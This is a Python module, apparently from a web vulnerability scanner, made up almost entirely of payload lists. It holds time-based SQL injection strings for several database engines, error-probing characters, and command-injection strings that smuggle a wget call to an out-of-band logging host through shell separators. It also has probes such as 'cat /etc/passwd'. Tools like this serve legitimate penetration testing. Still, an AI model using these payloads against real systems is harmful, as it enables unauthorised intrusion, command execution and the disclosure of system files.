#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-03-07 11:48:33
# @Author  : donot (donot@donot.me)
# @Link    : https://blog.donot.me

SQLiPayload_Sleep = [
	' and {sleep}',
	' and {sleep} -- -',
	' and {sleep} #',
    '\' and {sleep} -- -',
    '\' and {sleep} #',
    '\' and {sleep} and \'1\'=\'1',
    '{sleep}',
    'if(1=1,{sleep},1)',
    '" and {sleep} -- -',
    '" and {sleep} #',
    '" and {sleep} and "1"="1',
    "') and {sleep} -- -", 
    "') and {sleep} #", 
    '\') and {sleep} and (\'1\'=\'1',
    "')) and {sleep} --+-", 
    "')) and {sleep} #", 
    "')) and {sleep} (('1='1", 
    '") and {sleep} -- -',
    '") and {sleep} #',
    '") and {sleep} ("1"="1',
    '; WAITFOR DELAY \'0:0:3\';-- -',
    '\'; WAITFOR DELAY \'0:0:3\';-- -',
    '"; WAITFOR DELAY \'0:0:3\';-- -',
    '; select pg_sleep(3);-- -',
    '\';select pg_sleep(3);-- -',
    '";select pg_sleep(3);--+-',
    ' and 1=dbms_pipe.receive_message(\'XXX\',3)-- -',
    '\' and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3)-- -',
    '\' and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3) and \'1\'=\'',
    '" and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3)-- -',
    '" and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3) and "1"="1',
    '\') and 1=DBMS_PIPE.RECEIVE_MESSAGE(\'xxxx\',3)-- -'
]

SQLiPayload_Sleep_Normal = [
	' and 1',
	' and 1-- -',
	' and 1#',
	'\' and 1 -- -',
	'\' and 1 #',
	'\' and 1 and \'1\'=\'1',
	'',
	'if(1=1,1,1)',
	'" and 1 -- -',
	'" and 1 #',
	'" and "1"="1',
	'\') and 1 --+-',
	'\') and 1 #',
	'\') and 1 and (\'1\'=\'1',
	"')) and 1 -- -", 
	"')) and 1 #", 
	"')) and 1 (('1='1", 
	'") and 1 -- -',
	'") and 1 #',
	'") and 1 ("1"="1',
	'; --+-',
	'\'; --+-',
	'"; --+-',
	'; --+-',
	'\';--+-',
	'";--+-',
	' and 1=1-- -',
	'\' and 1=1-- -',
	'\' and 1=1 and \'1\'=\'',
	'" and 1=1-- -',
	'" and 1=1 and "1"="1',
	'\') and 1=1--+-'
]


SQLiPayload_ErrorBased = [
	'\'',
	'"',
	')',
	"\\",
	'-- -',
	'#',
	'`'
]


RCEPayload_DNSLOG = [
	';wget {randStr}.{DNSLogDomain};',
	'&&wget {randStr}.{DNSLogDomain}',
	'|wget {randStr}.{DNSLogDomain}',
	'`wget {randStr}.{DNSLogDomain}`',
	'$(wget {randStr}.{DNSLogDomain})',
	';wget{Separator}{randStr}.{DNSLogDomain}',
	'&&wget{Separator}{randStr}.{DNSLogDomain}',
	'|wget{Separator}{randStr}.{DNSLogDomain}',
	'`wget{Separator}{randStr}.{DNSLogDomain}',
	'$(wget{Separator}{randStr}.{DNSLogDomain})',
	# 'wget,{randStr}.{DNSLogDomain}',
]

RCEPayload_WEBLOG = [
	';wget {DNSLogDomain}/{randStr};',
	'&&wget {DNSLogDomain}/{randStr}',
	'|wget {DNSLogDomain}/{randStr}',
	'`wget {DNSLogDomain}/{randStr}`',
	'$(wget {DNSLogDomain}/{randStr})',
	';wget{Separator}{DNSLogDomain}/{randStr}',
	'&&wget{Separator}{DNSLogDomain}/{randStr}',
	'|wget{Separator}{DNSLogDomain}/{randStr}',
	'`wget{Separator}{DNSLogDomain}/{randStr}',
	'$(wget{Separator}{DNSLogDomain}/{randStr})',
]

RCEPayload_RESP = [
	['\'xor(phpinfo)or\'', 'phpinfo page'],
	['cat /etc/passwd', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'],
	['uname -a', 'Linux'],
	['cat /proc/version', 'Linux'],
	['set /a 1+222']
]


FILE_SCAN_PAYLODS = [
	
]